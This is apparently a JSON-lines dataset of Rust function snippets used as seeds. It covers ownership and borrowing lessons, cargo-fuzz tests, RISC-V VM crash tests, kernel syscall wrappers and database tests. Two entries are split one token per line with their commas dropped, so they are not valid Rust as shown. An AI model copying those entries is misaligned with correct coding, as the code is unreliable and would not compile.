{"seed":"fn copy_test() {\n    {\n        \/*\n        struct Label {\n            number: u32,\n        }\n\n        fn print(l: Label) {\n            println!(\"STAMP: {}\", l.number);\n        }\n        let l = Label { number: 3 };\n        print(l);\n        println!(\"My label number is: {}\", l.number); \/\/ error\n        *\/\n\n        #[derive(Copy, Clone)]\n        struct Label {\n            number: u32,\n        }\n\n        fn print(l: Label) {\n            println!(\"STAMP: {}\", l.number);\n        }\n        let l = Label { number: 3 };\n        print(l);\n        println!(\"My label number is: {}\", l.number);\n\n        \/*\n        #[derive(Copy, Clone)]\n        struct StringLabel {\n            name: String,\n        }\n        *\/\n    }\n}","id":69}
{"seed":"fn float_test() {\n    assert_eq!(5f32.sqrt() * 5f32.sqrt(), 5.);\n    assert_eq!((-1.01f64).floor(), -2.0);\n    assert!((-1. \/ std::f32::INFINITY).is_sign_negative());\n}","id":70}
{"seed":"fn print_uint(x:uint) {\n\tprintln!(\"{}\",x);\n}","id":71}
{"seed":"fn reference_test() {\n    use std::collections::HashMap;\n    type Table = HashMap<String, Vec<String>>;\n    let mut table = Table::new();\n    table.insert(\n        \"Gesualdo\".to_string(),\n        vec![\n            \"many madrigals\".to_string(),\n            \"Tenebrae Responsoria\".to_string(),\n        ],\n    );\n    table.insert(\n        \"Caravaggio\".to_string(),\n        vec![\n            \"The Musicians\".to_string(),\n            \"The Calling of St. Matthew\".to_string(),\n        ],\n    );\n    table.insert(\n        \"Cellini\".to_string(),\n        vec![\n            \"Perseus with the head of Medusa\".to_string(),\n            \"a salt cellar\".to_string(),\n        ],\n    );\n\n    fn show(table: Table) {\n        for (artist, works) in table {\n            println!(\"works by {}\", artist);\n            for work in works {\n                println!(\"  {}\", work);\n            }\n        }\n    }\n    fn show_with_ref(table: &Table) {\n        for (artist, works) in table {\n            println!(\"works by {}\", artist);\n            for work in works {\n                println!(\"  {}\", work);\n            }\n        }\n    }\n\n    fn sort_works(table: &mut Table) {\n        for (_artist, works) in table {\n            works.sort();\n        }\n    }\n    show_with_ref(&table);\n    assert_eq!(table[\"Gesualdo\"][0], \"many madrigals\"); \/\/ OK\n    sort_works(&mut table);\n    assert_eq!(table[\"Gesualdo\"][1], \"many madrigals\"); \/\/ OK\n    show(table);\n    \/\/ assert_eq!(table[\"Cellini\"][0], \"a salt cellar\"); \/\/ error, use of moved value\n\n    \/\/ implicitily borrows\n    struct Anime {\n        name: &'static str,\n        bechdel_pass: bool,\n    };\n    let aria = Anime {\n        name: \"Aria: The Animation\",\n        bechdel_pass: true,\n    };\n    let anime_ref = &aria;\n    assert_eq!(anime_ref.name, \"Aria: The Animation\");\n    assert_eq!((*anime_ref).name, \"Aria: The Animation\");\n    assert_eq!((*anime_ref).bechdel_pass, true);\n\n    let mut v = vec![1973, 1968];\n    v.sort();\n    (&mut v).sort();\n\n    let mut x = 10;\n    let mut y = 20;\n    let mut r = &x;\n    let b = true;\n\n    if b {\n        r = &y;\n    }\n\n    assert!(*r == 20);\n\n    struct Point {\n        x: i32,\n        y: i32,\n    }\n    let point = Point { x: 1000, y: 729 };\n    let r: &Point = &point;\n    let rr: &&Point = &r;\n    let rrr: &&&Point = &rr;\n    assert_eq!(rrr.x, 1000);\n    assert_eq!(rrr.y, 729);\n\n    x = 10;\n    y = 10;\n\n    let rx = &x;\n    let ry = &y;\n\n    let rrx = &rx;\n    let rry = &ry;\n    \/\/ assert!(rrx <= rry);\n    assert!(rrx == rry);\n    assert!(!std::ptr::eq(rrx, rry));\n    fn factorial(n: usize) -> usize {\n        (1..n + 1).fold(1, |a, b| a * b)\n    }\n    let f = &factorial(6);\n    assert_eq!(f + &1009, 1729);\n\n    {\n        let r;\n        {\n            let x = 1;\n            r = &x;\n            assert_eq!(*r, 1); \/\/ OK\n        }\n        \/\/ assert_eq!(*r, 1); \/\/ error;\n    }\n\n    static mut STASH: &i32 = &128;\n    \/\/ fn test_func(p: &i32) { \/\/ error\n    \/\/ fn test_func<'a>(p: &'a &i32) { \/\/ error too, this is the same as the above definition\n    fn test_func(p: &'static i32) {\n        \/\/ OK\n        unsafe {\n            STASH = p;\n        }\n    }\n\n    static WORTH_POINTING_AT: i32 = 1000;\n    test_func(&WORTH_POINTING_AT);\n    unsafe {\n        assert_eq!(STASH, &1000);\n    }\n    fn smallest(v: &[i32]) -> &i32 {\n        let mut s = &v[0];\n        for r in &v[1..] {\n            if *r < *s {\n                s = r;\n            }\n        }\n        s\n    }\n    {\n        let parabola = [9, 4, 1, 0, 1, 4, 9];\n        let s = smallest(&parabola);\n        assert_eq!(*s, 0);\n    }\n\n    \/*\n    struct S {\n        r: &i32,\n    }\n\n    let s;\n    {\n        let x = 10;\n        s = S { r: &x };\n    }\n    *\/\n    \/\/ assert_eq!(*s, 10); \/\/ error\n\n    \/*\n    struct S<'a, 'b> {\n        x: &'a i32,\n        y: &'b i32,\n    }\n\n    \/\/ fn sum_r_xy<'a, 'b, 'c>(r: &'a &i32, s: S<'b, 'c>) -> i32 {\n    fn sum_r_xy(r: &i32, s: S) -> i32 {\n        r + s.x + s.y\n    }\n    \/\/ fn first_third<'a>(point: &'a &[i32; 3]) -> (&'a i32, &'a i32) {\n    fn first_third(point: &[i32; 3]) -> (&i32, &i32) {\n        (&point[0], &point[2])\n    }\n\n    struct StringTable {\n        elements: Vec<String>,\n    }\n\n    impl StringTable {\n        \/\/ fn find_by_prefix<'a, 'b>(&'a self, prefix: &'b str) -> Option<&'a String> {\n        fn find_by_prefix(&self, prefix: &str) -> Option<&String> {\n            for i in 0..self.elements.len() {\n                if self.elements[i].starts_with(prefix) {\n                    return Some(&self.elements[i]);\n                }\n            }\n            None\n        }\n    }\n    *\/\n\n    {\n        \/*\n        let v = vec![4, 8, 19, 27, 34, 10];\n        let r = &v;\n        let aside = v;\n        r[0]; \/\/ error\n        *\/\n        let v = vec![4, 8, 19, 27, 34, 10];\n        {\n            let r = &v;\n            r[0];\n        }\n        let aside = v;\n        assert_eq!(aside[0], 4);\n    }\n    {\n        fn extend(vec: &mut Vec<f64>, slice: &[f64]) {\n            for elt in slice {\n                vec.push(*elt);\n            }\n        }\n        let mut wave = Vec::new();\n        let head = vec![0.0, 1.0];\n        let tail = [0.0, -1.0];\n\n        extend(&mut wave, &head);\n        extend(&mut wave, &tail);\n\n        assert_eq!(wave, vec![0.0, 1.0, 0.0, -1.0]);\n\n        \/\/ extend(&mut wave, &wave); \/\/ error\n    }\n    {\n        let mut x = 10;\n        {\n            let r1 = &x;\n            let r2 = &x;\n            assert_eq!(r1, r2);\n            \/\/ x += 10; \/\/ error, it is borrowed\n        }\n        x += 10;\n        assert_eq!(x, 20);\n\n        \/\/ let m = &mut x; \/\/ error, it is also borrowed as immutable\n\n        let mut y = 20;\n        let m1 = &mut y;\n        \/\/ let m2 = &mut y; \/\/ error, cannot borrow as mutable more than once\n        \/\/ let z = y; \/\/ error, cannot use 'y' because it was mutably borrowed\n        assert_eq!(&20, m1);\n\n        {\n            let mut w = (107, 109);\n            w.0 = 108;\n            let r = &w;\n            let r0 = &r.0;\n            \/\/ let m1 = &mut r.1; \/\/ error: can't reborrow shared as mutable\n\n            assert_eq!(r0, &108);\n            assert_eq!(w, (108, 109));\n        }\n    }\n}","id":72}
{"seed":"pub fn test_misaligned_jump64() {\n    let buffer = fs::read(\"tests\/programs\/misaligned_jump64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"misaligned_jump64\".into()]);\n    assert!(result.is_ok());\n}","id":73}
{"seed":"pub fn test_flat_crash_64() {\n    let buffer = fs::read(\"tests\/programs\/flat_crash_64\").unwrap().into();\n    let core_machine =\n        DefaultCoreMachine::<u64, FlatMemory<u64>>::new(ISA_IMC, VERSION0, u64::max_value());\n    let mut machine = DefaultMachineBuilder::new(core_machine).build();\n    let result = machine.load_program(&buffer, &vec![\"flat_crash_64\".into()]);\n    assert_eq!(result.err(), Some(Error::MemOutOfBound));\n}","id":74}
{"seed":"pub fn test_op_rvc_srli_crash_32() {\n    let buffer = fs::read(\"tests\/programs\/op_rvc_srli_crash_32\")\n        .unwrap()\n        .into();\n    let result = run::<u32, SparseMemory<u32>>(&buffer, &vec![\"op_rvc_srli_crash_32\".into()]);\n    assert_eq!(result.err(), Some(Error::MemWriteOnExecutablePage));\n}","id":75}
{"seed":"fn run_a_few_inputs() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"run_few\");\n\n    let project = project(\"run_a_few_inputs\")\n        .with_fuzz()\n        .fuzz_target(\n            \"run_few\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    assert!(data.len() != 4);\n                });\n            \"#,\n        )\n        .file(corpus.join(\"pass-0\"), \"\")\n        .file(corpus.join(\"pass-1\"), \"1\")\n        .file(corpus.join(\"pass-2\"), \"12\")\n        .file(corpus.join(\"pass-3\"), \"123\")\n        .file(corpus.join(\"fail\"), \"fail\")\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"run_few\")\n        .arg(corpus.join(\"pass-0\"))\n        .arg(corpus.join(\"pass-1\"))\n        .arg(corpus.join(\"pass-2\"))\n        .arg(corpus.join(\"pass-3\"))\n        .assert()\n        .stderr(\n            predicate::str::contains(\"Running 4 inputs 1 time(s) each.\").and(\n                predicate::str::contains(\"Running: fuzz\/corpus\/run_few\/pass\"),\n            ),\n        )\n        .success();\n}","id":76}
{"seed":"fn a_table_should_reject_a_stale_write() {\n  let mut table = HashMapOfTreeMap::new();\n  table.write(0, &[Row { k: 0, v: 1 }]);\n  assert_eq!(table.write(0, &[Row { k: 0, v: 2 }]), WriteResult::Stale { cond: 0, max: 1 });\n  let mut vs = [Value::default(); 1];\n  table.read (1, &[0], &mut vs);\n  assert_eq!(vs, [Value { v: 1, t: 1 }]);\n}","id":77}
{"seed":"fn\ntest_blob\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\nlet\nv1234\n=\nvec\n!\n[\n1u8\n2\n3\n4\n]\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nb\n)\nVALUES\n(\n?\n1\n)\n\"\n[\n&\nv1234\n]\n)\n?\n;\nlet\nv\n:\nVec\n<\nu8\n>\n=\ndb\n.\none_column\n(\n\"\nSELECT\nb\nFROM\nfoo\n\"\n)\n?\n;\nassert_eq\n!\n(\nv\nv1234\n)\n;\nOk\n(\n(\n)\n)\n}","id":78}
{"seed":"pub fn task_set_buffer(target: CAddr, buffer: CAddr) {\n    system_call(SystemCall::TaskSetBuffer {\n        request: (target, buffer),\n    });\n}","id":79}
{"seed":"fn\ntest_option\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\nlet\ns\n=\nSome\n(\n\"\nhello\nworld\n!\n\"\n)\n;\nlet\nb\n=\nSome\n(\nvec\n!\n[\n1u8\n2\n3\n4\n]\n)\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nt\n)\nVALUES\n(\n?\n1\n)\n\"\n[\n&\ns\n]\n)\n?\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nb\n)\nVALUES\n(\n?\n1\n)\n\"\n[\n&\nb\n]\n)\n?\n;\nlet\nmut\nstmt\n=\ndb\n.\nprepare\n(\n\"\nSELECT\nt\nb\nFROM\nfoo\nORDER\nBY\nROWID\nASC\n\"\n)\n?\n;\nlet\nmut\nrows\n=\nstmt\n.\nquery\n(\n[\n]\n)\n?\n;\n{\nlet\nrow1\n=\nrows\n.\nnext\n(\n)\n?\n.\nunwrap\n(\n)\n;\nlet\ns1\n:\nOption\n<\nString\n>\n=\nrow1\n.\nget_unwrap\n(\n0\n)\n;\nlet\nb1\n:\nOption\n<\nVec\n<\nu8\n>\n>\n=\nrow1\n.\nget_unwrap\n(\n1\n)\n;\nassert_eq\n!\n(\ns\n.\nunwrap\n(\n)\ns1\n.\nunwrap\n(\n)\n)\n;\nassert\n!\n(\nb1\n.\nis_none\n(\n)\n)\n;\n}\n{\nlet\nrow2\n=\nrows\n.\nnext\n(\n)\n?\n.\nunwrap\n(\n)\n;\nlet\ns2\n:\nOption\n<\nString\n>\n=\nrow2\n.\nget_unwrap\n(\n0\n)\n;\nlet\nb2\n:\nOption\n<\nVec\n<\nu8\n>\n>\n=\nrow2\n.\nget_unwrap\n(\n1\n)\n;\nassert\n!\n(\ns2\n.\nis_none\n(\n)\n)\n;\nassert_eq\n!\n(\nb\nb2\n)\n;\n}\nOk\n(\n(\n)\n)\n}","id":80}
{"seed":"fn append_text_column(tree: &mut gtk::TreeView) {\n    let column = gtk::TreeViewColumn::new().unwrap();\n    let cell = gtk::CellRendererText::new().unwrap();\n\n    column.pack_start(&cell, true);\n    column.add_attribute(&cell, \"text\", 0);\n    tree.append_column(&column);\n}","id":81}
{"seed":"pub fn write_board(board_name: String, contents: String) -> Result<(), String> {\n    let mut configurator = Configurator::new();\n    unsafe {\n        configurator.set_working_folder(WORKING_FOLDER.clone());\n    }\n    configurator.write_board(board_name, contents)\n}","id":82}
{"seed":"fn init_finds_parent_project() {\n    let project = project(\"init_finds_parent_project\").build();\n    project\n        .cargo_fuzz()\n        .current_dir(project.root().join(\"src\"))\n        .arg(\"init\")\n        .assert()\n        .success();\n    assert!(project.fuzz_dir().is_dir());\n    assert!(project.fuzz_cargo_toml().is_file());\n    assert!(project.fuzz_targets_dir().is_dir());\n    assert!(project.fuzz_target_path(\"fuzz_target_1\").is_file());\n}","id":83}
{"seed":"fn run_one_input() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"run_one\");\n\n    let project = project(\"run_one_input\")\n        .with_fuzz()\n        .fuzz_target(\n            \"run_one\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    #[cfg(fuzzing_repro)]\n                    eprintln!(\"Reproducing a crash\");\n\n                    assert!(data.is_empty());\n                });\n            \"#,\n        )\n        .file(corpus.join(\"pass\"), \"\")\n        .file(corpus.join(\"fail\"), \"not empty\")\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"run_one\")\n        .arg(corpus.join(\"pass\"))\n        .assert()\n        .stderr(\n            predicate::str::contains(\"Running 1 inputs 1 time(s) each.\")\n                .and(predicate::str::contains(\n                    \"Running: fuzz\/corpus\/run_one\/pass\",\n                ))\n                .and(predicate::str::contains(\"Reproducing a crash\")),\n        )\n        .success();\n}","id":84}
{"seed":"fn vector_test() {\n    {\n        fn build_vector() -> Vec<i16> {\n            let mut v: Vec<i16> = Vec::<i16>::new();\n            v.push(10i16);\n            v.push(20i16);\n            v\n        }\n\n        fn build_vector_2() -> Vec<i16> {\n            let mut v = Vec::new();\n            v.push(10);\n            v.push(20);\n            v\n        }\n        let v1 = build_vector();\n        let v2 = build_vector_2();\n        assert_eq!(v1, v2);\n    }\n    let mut v1 = vec![2, 3, 5, 7];\n    assert_eq!(v1.iter().fold(1, |a, b| a * b), 210);\n\n    v1.push(11);\n    v1.push(13);\n    assert_eq!(v1.iter().fold(1, |a, b| a * b), 30030);\n\n    let mut v2 = Vec::new();\n    v2.push(\"step\");\n    v2.push(\"on\");\n    v2.push(\"no\");\n    v2.push(\"pets\");\n    assert_eq!(v2, vec![\"step\", \"on\", \"no\", \"pets\"]);\n\n    let v3: Vec<i32> = (0..5).collect();\n    assert_eq!(v3, [0, 1, 2, 3, 4]);\n\n    let mut v4 = vec![\"a man\", \"a plan\", \"a canal\", \"panama\"];\n    v4.reverse();\n    assert_eq!(v4, vec![\"panama\", \"a canal\", \"a plan\", \"a man\"]);\n\n    let mut v5 = Vec::with_capacity(2);\n    assert_eq!(v5.len(), 0);\n    assert_eq!(v5.capacity(), 2);\n\n    v5.push(1);\n    v5.push(2);\n    assert_eq!(v5.len(), 2);\n    assert_eq!(v5.capacity(), 2);\n\n    v5.push(3);\n    assert_eq!(v5.len(), 3);\n    assert_eq!(v5.capacity(), 4);\n\n    let mut v6 = vec![10, 20, 30, 40, 50];\n\n    v6.insert(3, 35);\n    assert_eq!(v6, [10, 20, 30, 35, 40, 50]);\n\n    v6.remove(1);\n    assert_eq!(v6, [10, 30, 35, 40, 50]);\n\n    let mut v7 = vec![\"carmen\", \"miranda\"];\n    assert_eq!(v7.pop(), Some(\"miranda\"));\n    assert_eq!(v7.pop(), Some(\"carmen\"));\n    assert_eq!(v7.pop(), None);\n\n    \/\/ let languages: Vec<String> = std::env::args().skip(1).collect();\n    let languages = vec![\"Lisp\", \"Scheme\", \"C\", \"C++\", \"Fortran\"];\n    let mut v8 = Vec::new();\n    for l in languages {\n        if l.len() % 2 == 0 {\n            v8.push(\"functional\");\n        } else {\n            v8.push(\"imperative\");\n        }\n    }\n    assert_eq!(\n        v8,\n        [\n            \"functional\",\n            \"functional\",\n            \"imperative\",\n            \"imperative\",\n            \"imperative\"\n        ]\n    );\n\n    \/\/ slice\n\n    let v9: Vec<f64> = vec![0.0, 0.707, 1.0, 0.707];\n    let a9: [f64; 4] = [0.0, 0.707, 1.0, 0.707];\n\n    let sv: &[f64] = &v9;\n    let sa: &[f64] = &a9;\n\n    assert_eq!(sv[0..2], [0.0, 0.707]);\n    assert_eq!(sa[2..], [1.0, 0.707]);\n    assert_eq!(&sv[1..3], [0.707, 1.0]);\n}","id":85}
{"seed":"pub fn channel_take_raw(target: CAddr) -> u64 {\n    let result = channel_take_nonpayload(target);\n    match result {\n        ChannelMessage::Raw(v) => return v,\n        _ => panic!(),\n    };\n}","id":86}
{"seed":"pub fn channel_take_cap(target: CAddr) -> CAddr {\n    let result = channel_take_nonpayload(target);\n    match result {\n        ChannelMessage::Cap(v) => return v.unwrap(),\n        _ => panic!(),\n    };\n}","id":87}
{"seed":"async fn get_historic_trades() {\n    let exchange = init().await;\n    let req = GetHistoricTradesRequest {\n        market_pair: \"eth_btc\".to_string(),\n        paginator: Some(Paginator {\n            limit: Some(100),\n            ..Default::default()\n        }),\n    };\n    let resp = exchange.get_historic_trades(&req).await.unwrap();\n    println!(\"{:?}\", resp);\n}","id":88}
{"seed":"async fn order_book() {\n    let exchange = init().await;\n    let req = OrderBookRequest {\n        market_pair: \"eth_btc\".to_string(),\n    };\n    let resp = exchange.order_book(&req).await.unwrap();\n    println!(\"{:?}\", resp);\n}","id":89}
{"seed":"pub fn test_wxorx_crash_64() {\n    let buffer = fs::read(\"tests\/programs\/wxorx_crash_64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"wxorx_crash_64\".into()]);\n    assert_eq!(result.err(), Some(Error::MemOutOfBound));\n}","id":90}
{"seed":"pub fn channel_put<T: Any + Clone>(target: CAddr, value: T) {\n    system_call_put_payload(SystemCall::ChannelPut {\n        request: (target, ChannelMessage::Payload)\n    }, value);\n}","id":91}
{"seed":"fn decode_ppm_image(cursor: &mut Cursor<Vec<u8>>) -> Result<Image, Box<std::error::Error>> {\n    let mut image = Image { \n        width : 0,\n        height: 0,\n        pixels: vec![]\n    };\n\n    \/\/ read header\n    let mut c: [u8; 2] = [0; 2];\n    cursor.read(&mut c)?;\n    match &c {\n        b\"P6\" => { },\n          _   => { bail!(\"error\") }\n    }\n    \n    let w  = read_num(cursor)?;\n    let h  = read_num(cursor)?;\n    let cr = read_num(cursor)?;\n\n    print!(\"width: {}, height: {}, color range: {}\\n\", w, h, cr);\n\n\t\/\/ TODO: Parse the image here\n\n    let mut pxls:Vec<Vec<Pixel>> = vec![];\n\n    let mut buff: [u8; 1] = [0];\n    loop{\n        cursor.read(&mut buff)?;\n        match &buff {\n            b\" \" | b\"\\t\" | b\"\\n\" => {},\n              _                  => { cursor.seek(std::io::SeekFrom::Current(-1)); break; }\n        };\n    };\n\n    for x in 0..h {\n        let mut row: Vec<Pixel> = vec!();\n        for y in 0..w {\n            let mut mv: Vec<u8> = vec![];\n            for mut z in 0..3 {\n                mv.push(cursor.read_u8()?);\n            }\n\n            let px = Pixel {\n                R: mv[0] as u32,\n                G: mv[1] as u32,\n                B: mv[2] as u32\n            };\n            row.push(px);\n        }\n        pxls.insert(0, row);\n    }\n\n    image = Image {\n        width : w,\n        height: h,\n        pixels: pxls\n    };\n\n    Ok(image)\n}","id":92}
{"seed":"pub fn channel_put_raw(target: CAddr, value: u64) {\n    system_call(SystemCall::ChannelPut {\n        request: (target, ChannelMessage::Raw(value))\n    });\n}","id":93}
{"seed":"pub fn get_driver(url: &str) -> MigrateResult<Box<Driver>> {\n    \/\/ Mysql driver does not allow to connect using a url so we need to parse it\n    let mut parser = UrlParser::new();\n    parser.scheme_type_mapper(db_scheme_type_mapper);\n    let parsed = parser.parse(url).unwrap();\n\n    match parsed.scheme.as_ref() {\n        \"postgres\" => postgres::Postgres::new(url).map(|d| Box::new(d) as Box<Driver>),\n        \"mysql\" => mysql::Mysql::new(parsed).map(|d| Box::new(d) as Box<Driver>),\n        _ => Err(invalid_url(url))\n    }\n}","id":94}
{"seed":"fn main() {\n  let mut prod_env = \"\".to_string();\n\n  let ws_server_thread = thread::Builder::new().name(\"ws_server\".to_string()).spawn(move || {\n      println!(\"Starting websocket server..\");\n      listen(\"127.0.0.1:3012\", |out| { Server { out: out } }).unwrap()\n  }).unwrap();\n\n  thread::sleep(time::Duration::from_millis(1000));\n  match env::var(\"PROD_ENV\".to_string()) {\n      Ok(val) => prod_env = val,\n      Err(e) => println!(\"Operating in dev mode due to: {}\", e),\n  }\n\n  if prod_env != \"\" {\n    let app_router_thread = thread::Builder::new().name(\"app_router\".to_string()).spawn(move || {\n        let mut app_router = Nickel::new();\n        println!(\"Starting app router..\");\n        app_router.mount(\"\/controller\/\", StaticFilesHandler::new(\"app\/controller\/\"));\n        app_router.mount(\"\/display\/\", StaticFilesHandler::new(\"app\/display\/\"));\n        app_router.listen(\"127.0.0.1:6767\").unwrap();\n    }).unwrap();\n    let _ = app_router_thread.join();\n  }\n\n  let _ = ws_server_thread.join();\n  println!(\"Server closing down..\");\n}","id":95}
{"seed":"fn init_twice() {\n    let project = project(\"init_twice\").build();\n\n    \/\/ First init should succeed and make all the things.\n    project.cargo_fuzz().arg(\"init\").assert().success();\n    assert!(project.fuzz_dir().is_dir());\n    assert!(project.fuzz_cargo_toml().is_file());\n    assert!(project.fuzz_targets_dir().is_dir());\n    assert!(project.fuzz_target_path(\"fuzz_target_1\").is_file());\n\n    \/\/ Second init should fail.\n    project\n        .cargo_fuzz()\n        .arg(\"init\")\n        .assert()\n        .stderr(predicates::str::contains(\"File exists (os error 17)\").and(\n            predicates::str::contains(format!(\n                \"failed to create directory {}\",\n                project.fuzz_dir().display()\n            )),\n        ))\n        .failure();\n}","id":96}
{"seed":"fn system_call_take_payload<T: Any + Clone>(message: SystemCall) -> (SystemCall, T) {\n    use core::mem::{size_of};\n    let addr = task_buffer_addr();\n\n    unsafe {\n        let buffer = &mut *(addr as *mut TaskBuffer);\n        buffer.call = Some(message);\n\n        system_call_raw();\n\n        let payload_addr = &mut buffer.payload_data as *mut _ as *mut T;\n        let payload_data = &*payload_addr;\n        assert!(buffer.payload_length != 0 && buffer.payload_length == size_of::<T>());\n\n        (buffer.call.take().unwrap(), payload_data.clone())\n    }\n}","id":97}
{"seed":"pub fn task_set_inactive(target: CAddr) {\n    system_call(SystemCall::TaskSetInactive {\n        request: target\n    });\n}","id":98}
{"seed":"fn debug_check_layout(layout: Layout) {\n    debug_assert!(layout.size() <= LARGEST_POWER_OF_TWO);\n    debug_assert!(layout.size() > 0);\n}","id":99}
{"seed":"pub fn quick_sort<T: PartialOrd + Debug>(v: &mut [T]) {\n    if v.len() <= 1 {\n        return;\n    }\n    let p = pivot(v);\n    println!(\"{:?}\", v);\n    let (a, b) = v.split_at_mut(p);\n    quick_sort(a);\n    quick_sort(&mut b[1..]);\n}","id":100}
{"seed":"pub fn map_raw_page_free(vaddr: usize, untyped: CAddr, toplevel_table: CAddr, page: CAddr) {\n    system_call(SystemCall::MapRawPageFree {\n        untyped: untyped,\n        toplevel_table: toplevel_table,\n        request: (vaddr, page),\n    });\n}","id":101}
{"seed":"async fn run_completions(shell: ShellCompletion) -> Result<()> {\n\tinfo!(version=%env!(\"CARGO_PKG_VERSION\"), \"constructing completions\");\n\n\tfn generate(generator: impl Generator) {\n\t\tlet mut cmd = Args::command();\n\t\tclap_complete::generate(generator, &mut cmd, \"watchexec\", &mut std::io::stdout());\n\t}\n\n\tmatch shell {\n\t\tShellCompletion::Bash => generate(Shell::Bash),\n\t\tShellCompletion::Elvish => generate(Shell::Elvish),\n\t\tShellCompletion::Fish => generate(Shell::Fish),\n\t\tShellCompletion::Nu => generate(clap_complete_nushell::Nushell),\n\t\tShellCompletion::Powershell => generate(Shell::PowerShell),\n\t\tShellCompletion::Zsh => generate(Shell::Zsh),\n\t}\n\n\tOk(())\n}","id":102}
{"seed":"fn run() -> Result<(), Box<dyn std::error::Error>> {\n    let by_version = generate_thanks()?;\n\n    let mut all_time = by_version.values().next().unwrap().clone();\n    for map in by_version.values().skip(1) {\n        all_time.extend(map.clone());\n    }\n\n    site::render(by_version, all_time)?;\n\n    Ok(())\n}","id":103}
{"seed":"fn a_table_should_read_what_was_put() {\n  let mut table = HashMapOfTreeMap::new();\n  table.write(0, &[Row { k: 0, v: 1 }]);\n  let mut vs = [Value::default(); 1];\n  table.read (1, &[0], &mut vs);\n  assert_eq!(vs, [Value { v: 1, t: 1 }]);\n}","id":104}
{"seed":"fn de_l(raw: f32, even: bool) -> i32 {\n    if even && raw < 0.0 {\n        (raw.ceil() - 1.0) as i32\n    } else {\n        raw.floor() as i32\n    }\n}","id":105}
{"seed":"fn rc_test() {\n    use std::rc::Rc;\n\n    let s: Rc<String> = Rc::new(\"shirataki\".to_string());\n    let t: Rc<String> = s.clone();\n    let u: Rc<String> = s.clone();\n\n    assert!(s.contains(\"shira\"));\n    assert_eq!(t.find(\"taki\"), Some(5));\n    println!(\"{} are quite chewy, almost bouncy, but lack flavor\", u);\n\n    \/\/ s.push_str(\" noodles\"); \/\/ error\n}","id":106}
{"seed":"fn run_with_different_fuzz_dir() {\n    let (fuzz_dir, mut project_builder) = project_with_fuzz_dir(\n        \"project_likes_to_move_it\",\n        Some(\"dir_likes_to_move_it_move_it\"),\n    );\n    let project = project_builder\n        .with_fuzz()\n        .fuzz_target(\n            \"you_like_to_move_it\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|_data: &[u8]| {\n                });\n            \"#,\n        )\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"--fuzz-dir\")\n        .arg(fuzz_dir)\n        .arg(\"you_like_to_move_it\")\n        .arg(\"--\")\n        .arg(\"-runs=1\")\n        .assert()\n        .stderr(predicate::str::contains(\"Done 2 runs\"))\n        .success();\n}","id":107}
{"seed":"pub fn acrn_read(file_path: &str) -> Result<String, String> {\n    let mut file = File::open(file_path).map_err(|e| e.to_string())?;\n    let mut contents = String::new();\n    file.read_to_string(&mut contents)\n        .map_err(|e| e.to_string())?;\n    Ok(contents)\n}","id":108}
{"seed":"fn align_padding(value: usize, alignment: usize) -> usize {\n    debug_assert!(alignment.is_power_of_two());\n    let result = (alignment - (value & (alignment - 1))) & (alignment - 1);\n    debug_assert!(result < alignment);\n    debug_assert!(result < LARGEST_POWER_OF_TWO);\n    result\n}","id":109}
{"seed":"fn map_message(tok: IRCToken) -> Result<IRCToken, ~str> {\n    \/\/ Sequence(~[Sequence(~[Sequence(~[Unparsed(~\":\"), PrefixT(irc::Prefix{nick: ~\"tiffany\", user: ~\"lymia\", host: ~\"hugs\"}), Ignored])]), Unparsed(~\"PRIVMSG\"), Sequence(~[Params(~[~\"##codelab\", ~\"hi\"])])])\n    match tok {\n        Sequence([Sequence([Sequence([Unparsed(~\":\"), PrefixT(prefix), Ignored])]), Unparsed(cmd), Sequence([Params(params)])]) =>\n            Ok(MessageT(Message {prefix: Some(prefix), command: cmd, params: params})),\n        Sequence([Sequence([]), Unparsed(cmd), Sequence([Params(params)])]) => \n            Ok(MessageT(Message {prefix: None, command: cmd, params: params})),\n        _ => Err(fmt!(\"Malformed message: %?\", tok))\n    }\n}","id":110}
{"seed":"async fn client<R: tokio::io::AsyncRead + std::marker::Unpin>(url: &str, input_read: R) -> Result<!, String> {\n\n    let (read, write) = TcpStream::connect(url).await.map_err(|e| e.to_string())?\n        .into_split();\n\n    let read_comp = TcpOp::<ResponseLatRepr>::new(read)\n        .comp_null();\n        \/\/ .comp_debug(\"read\");\n\n    let write_comp = ReadOp::new(input_read)\n        .morphism(ParseKvsOperation)\n        .debottom()\n        .comp_tcp::<RequestLatRepr>(write);\n\n    #[allow(unreachable_code)]\n    let result = tokio::try_join!(\n        async {\n            read_comp.run().await.map_err(|_| format!(\"Read failed.\"))\n        },\n        async {\n            let err = write_comp.run().await.map_err(|e| e.to_string());\n            tokio::time::sleep(std::time::Duration::from_secs(5)).await;\n            err\n        },\n    );\n\n    result?;\n    unreachable!();\n\n    \/\/ Err(format!(\"Read error: {:?}, Write error: {:?}\",\n    \/\/     result.0.unwrap_err(), result.1.unwrap_err()))\n}","id":111}
